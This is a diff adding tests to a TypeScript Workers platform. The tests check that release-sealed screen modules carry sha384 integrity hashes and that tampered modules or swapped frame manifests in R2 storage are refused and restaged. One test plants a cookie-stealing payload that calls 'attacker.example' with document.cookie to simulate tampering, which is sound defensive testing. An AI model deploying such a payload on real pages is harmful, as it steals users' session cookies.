@@ -1,3 +1,4 @@
+import { toBase64 } from "@grasp-os/shared/encoding";
 import { appIdSchema } from "@grasp-os/shared/ids";
 import { env } from "cloudflare:workers";
 import { eq } from "drizzle-orm";
@@ -9,7 +10,7 @@ import { loadRelease, sealedScreen } from "../src/app-releases.ts";
 import { appCandidateReports, appCandidates } from "../src/db/core/schema.ts";
 import { release } from "./apps.ts";
 import { mockIdp } from "./idp.ts";
-import { loadFrame } from "./screen-frames.ts";
+import { frameDocument, loadFrame, pathOf, routed } from "./screen-frames.ts";
 import { artifactKey, failure } from "./sealed-apps.ts";
 import { signedInApi } from "./sign-in.ts";
 
@@ -76,6 +77,31 @@ const published = async () => {
   const { id } = await builder.api.apps.create({ name: "Sealed screens" });
   await release(builder, id, files);
   return { builder, app: id, id: appIdSchema.parse(id) };
+};
+
+/** Where a build's frame manifest is staged in R2. */
+const manifestKey = (artifact: string): string =>
+  `screen-frames/${artifact}.json`;
+
+/** Where a module an import map names is staged in R2. */
+const moduleKeyOf = (address: string): string =>
+  `screen-modules/${new URL(address).pathname.split("/").at(-1) ?? ""}`;
+
+/** The sha384 Subresource Integrity of `text`, as a browser checks it. */
+const sha384 = async (text: string): Promise<string> =>
+  `sha384-${toBase64(
+    new Uint8Array(
+      await crypto.subtle.digest("SHA-384", new TextEncoder().encode(text))
+    )
+  )}`;
+
+/** What core answers for `path`: its status, and how long it may be kept. */
+const served = async (path: string) => {
+  const response = await routed(path);
+  return {
+    status: response.status,
+    cache: response.headers.get("cache-control"),
+  };
 };
 
 describe("screens sealed with their release", { timeout: 120_000 }, () => {
@@ -199,6 +225,125 @@ describe("screens sealed with their release", { timeout: 120_000 }, () => {
     }).toStrictEqual({
       changed: "version.artifact_corrupt",
       unsealed: "screen.not_sealed",
+    });
+  });
+
+  it("names the sha384 of every module its frame loads, of the very bytes served", async () => {
+    const { builder, app } = await published();
+    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
+    if (frame === null) {
+      throw new Error("An opened screen has a frame");
+    }
+
+    const expected = Object.fromEntries(
+      await Promise.all(
+        Object.entries(frame.addresses).map(
+          async ([name, address]) =>
+            [address, await sha384(frame.modules[name] ?? "")] as const
+        )
+      )
+    );
+    expect(frame.integrity).toStrictEqual(expected);
+  });
+
+  it("refuses a staged module changed in R2, and stages it again from the sealed bytes at the next open", async () => {
+    const { builder, app } = await published();
+    const bundle = await builder.api.screens.open(app, "desk");
+    const frame = await loadFrame(bundle);
+    const [name, address] = Object.entries(frame?.addresses ?? {}).find(
+      ([named]) => named.startsWith("app~")
+    ) ?? ["", ""];
+    const original = frame?.modules[name];
+
+    // Whoever can write the bucket swaps the module's code, and keeps
+    // what else core stored beside it.
+    const key = moduleKeyOf(address);
+    const staged = await env.FILES.head(key);
+    await env.FILES.put(
+      key,
+      'fetch("https://attacker.example/" + document.cookie);',
+      {
+        customMetadata: staged?.customMetadata ?? {},
+      }
+    );
+    const tampered = await served(pathOf(address));
+    // The frame now misses a module: its document runs nothing.
+    const document = await frameDocument(bundle);
+
+    const reopened = await loadFrame(
+      await builder.api.screens.open(app, "desk")
+    );
+
+    expect({
+      tampered: { status: tampered.status, cache: tampered.cache },
+      document: document.status,
+      healed: reopened?.modules[name],
+    }).toStrictEqual({
+      tampered: { status: 404, cache: "no-store" },
+      document: 404,
+      healed: original,
+    });
+  });
+
+  it("refuses a staged module whose code and name were both changed, however it is named", async () => {
+    const { builder, app } = await published();
+    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
+    const [, address] = Object.entries(frame?.addresses ?? {}).find(([named]) =>
+      named.startsWith("app~")
+    ) ?? ["", ""];
+
+    await env.FILES.put(moduleKeyOf(address), "export default 1;", {
+      customMetadata: { name: "app~elsewhere" },
+    });
+
+    const { status } = await served(pathOf(address));
+    expect(status).toBe(404);
+  });
+
+  it("refuses a frame manifest changed in R2, or moved from another build, and stages it again at the next open", async () => {
+    const { builder, app } = await published();
+    const desk = await builder.api.screens.open(app, "desk");
+    const inbox = await builder.api.screens.open(app, "inbox");
+    const deskFrame = await loadFrame(desk);
+
+    // Inbox's manifest, MAC and all, under desk's build.
+    const inboxManifest = await env.FILES.get(manifestKey(inbox.artifact));
+    await env.FILES.put(
+      manifestKey(desk.artifact),
+      (await inboxManifest?.text()) ?? "",
+      { customMetadata: inboxManifest?.customMetadata ?? {} }
+    );
+    const moved = await frameDocument(desk);
+
+    // Desk's own manifest, its entry pointed elsewhere, its MAC kept.
+    await builder.api.screens.open(app, "desk");
+    const deskManifest = await env.FILES.get(manifestKey(desk.artifact));
+    const text = (await deskManifest?.text()) ?? "{}";
+    await env.FILES.put(
+      manifestKey(desk.artifact),
+      JSON.stringify({ ...JSON.parse(text), entry: "app~elsewhere" }),
+      { customMetadata: deskManifest?.customMetadata ?? {} }
+    );
+    const edited = await frameDocument(desk);
+
+    const reopened = await loadFrame(
+      await builder.api.screens.open(app, "desk")
+    );
+
+    expect({
+      moved: {
+        status: moved.status,
+        cache: moved.headers.get("cache-control"),
+      },
+      edited: {
+        status: edited.status,
+        cache: edited.headers.get("cache-control"),
+      },
+      reopened: reopened?.screen.entry,
+    }).toStrictEqual({
+      moved: { status: 404, cache: "no-store" },
+      edited: { status: 404, cache: "no-store" },
+      reopened: deskFrame?.screen.entry,
     });
   });
 
